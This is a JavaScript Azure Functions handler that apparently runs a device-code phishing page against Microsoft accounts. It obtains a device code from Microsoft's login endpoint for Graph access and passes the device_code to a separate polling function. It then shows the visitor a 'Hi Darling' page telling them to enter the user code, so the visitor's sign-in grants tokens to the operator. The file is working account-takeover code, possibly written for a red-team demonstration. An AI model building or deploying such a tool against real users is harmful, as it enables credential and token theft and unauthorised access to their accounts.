const { app } = require("@azure/functions");
const axios = require('axios')

const client_id = "1fec8e78-bce4-4aaf-ab1b-5451cc387264";
const resource = "https://graph.microsoft.com/";
const token_endpoint = "https://login.microsoftonline.com/common/oauth2/devicecode";

app.http("landing", {
  methods: ["GET"],
  authLevel: "anonymous",
  route: "/deviceCode",
  handler: async (request, context) => {

    const devicecode = await axios.post(token_endpoint, {
      "client_id": client_id,
      "resource": resource
    }, {
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'AzureAiTMFunction'
      }
    }).then(response => {
      //context.log(`Received response with status: ${response.status}`)
      return response.data
    })
      .catch((ex) => console.error(ex))

    context.log(`Device code: ${JSON.stringify(devicecode)}`)
    // dispatch to deviceCode poll function
    axios.put(request.url, {
      'device_code': devicecode.device_code
    }).catch((ex) => console.error(ex));

    const response = `"
    <html lang="en">
    <head>
    <title>Azure Device Code Function</title>
    <body style = "text-align: center;">
    <h1>Hi Darling</h1>
    <p>Please visit: <a href=${devicecode.verification_url} target="blank"> ${devicecode.verification_url}</a> to authenticate and enter the code: <pre>${devicecode.user_code}</pre><p>
    <pre></pre>
    <img src="https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Fwhatismyipaddress.com%2Fwp-content%2Fuploads%2Fphishing-links-1024x512.jpg&f=1&nofb=1&ipt=528ceabd47cc43fcf3b743d55a791647bf80cf8461034c858a7d274dddfdacf4&ipo=images">
    </body>
    </html>
    "`

    return new Response(response.substring(1, response.length - 2), {
      status: 200,
      headers: {
        'Content-Type': 'text/html; charset=utf-8',
        'X-Content-Type-Options': 'nosniff'
      }
    });
  },
});

